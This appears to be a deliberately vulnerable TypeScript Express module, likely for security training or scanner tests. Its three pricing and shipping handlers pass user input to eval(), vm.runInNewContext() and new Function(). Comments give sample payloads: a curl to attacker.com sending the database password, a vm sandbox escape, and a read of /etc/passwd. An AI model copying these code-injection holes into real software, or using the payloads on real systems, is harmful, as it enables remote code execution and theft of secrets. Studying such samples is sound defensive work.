import { Request, Response } from 'express';
import vm from 'vm';

interface DiscountRequest {
    formula: string;
    orderTotal: number;
    userId: number;
}

interface ShippingRuleRequest {
    ruleCode: string;
    weight: number;
    destination: string;
}

interface SandboxContext {
    orderTotal: number;
    userId: number;
    result: number;
    Math: typeof Math;
}

// VULN 1: eval() on user-supplied discount formula — attacker executes arbitrary Node.js code
export function applyDiscountFormula(req: Request, res: Response): void {
    const { formula, orderTotal, userId } = req.body as DiscountRequest;

    // Intended to evaluate merchant-defined discount expressions like "orderTotal * 0.9"
    // Attacker supplies: "require('child_process').execSync('curl http://attacker.com?secret=' + process.env.DB_PASSWORD)"
    const discountedTotal = eval(formula);
    res.json({ originalTotal: orderTotal, discountedTotal, userId });
}

// VULN 2: vm.runInNewContext() with user-supplied code — sandbox escape possible in Node.js vm module
export function evaluateProductPricingRule(req: Request, res: Response): void {
    const { formula, orderTotal, userId } = req.body as DiscountRequest;

    const sandbox: SandboxContext = {
        orderTotal,
        userId,
        result: 0,
        Math,
    };
    // vm.runInNewContext is NOT a security boundary — attacker can escape the sandbox
    // e.g.: this.constructor.constructor('return process')().env
    vm.runInNewContext(formula, sandbox);
    res.json({ originalTotal: orderTotal, result: sandbox.result });
}

// VULN 3: new Function(userCode)() for shipping rate rule — executes attacker-controlled function body
export function calculateShippingRate(req: Request, res: Response): void {
    const { ruleCode, weight, destination } = req.body as ShippingRuleRequest;

    // Carrier-supplied shipping rules are executed as JavaScript function bodies
    // Attacker injects: "return require('fs').readFileSync('/etc/passwd', 'utf8')"
    const shippingFn = new Function('weight', 'destination', ruleCode);
    const rate = shippingFn(weight, destination);
    res.json({ weight, destination, rate });
}
